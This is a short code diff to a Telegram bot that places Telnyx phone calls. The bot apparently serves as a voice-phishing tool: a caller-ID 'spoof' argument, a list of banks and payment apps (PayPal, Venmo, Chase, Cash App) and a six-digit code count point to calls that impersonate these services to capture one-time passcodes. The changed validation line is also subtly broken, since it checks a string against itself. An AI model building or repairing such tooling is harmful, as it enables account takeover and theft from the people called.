@@ -29,7 +29,7 @@ async function call (customer_number, ctx, service, digit){
    try {
       const { data: call } = await telnyx.calls.create({
          connection_id: alt_control_id,
-         to: customer_number,
+         to: `+${customer_number}`,
          from: service_number,
          // webhook_url: WEBHOOK_URL
       });      
@@ -82,10 +82,10 @@ bot.help(ctx => ctx.reply(`
 `))
 
 bot.command('call', ctx => {
-   const number = ctx.message.text.split(' ');
-   const service = [ 'paypal', 'venmo', 'boa', 'chase', 'bank', 'cashapp' ]
+   const [command, spoof, number, service ]= ctx.message.text.split(' ');
+   const serviceList = [ 'paypal', 'venmo', 'boa', 'chase', 'bank', 'cashapp' ]
 
-   if(!number[1] || !service.includes(number[3])){
+   if( !number || !service.includes(service) ){
       bot.telegram.sendMessage(ctx.chat.id, `❌ Error  : Invalid number or service not available`, {}).then(() => {})
    }
    else{
@@ -102,7 +102,7 @@ bot.command('call', ctx => {
          }
       }).then(() => {})
 
-      call(number[3], ctx )
+      call(number, ctx, service, 6)
    }
 
 
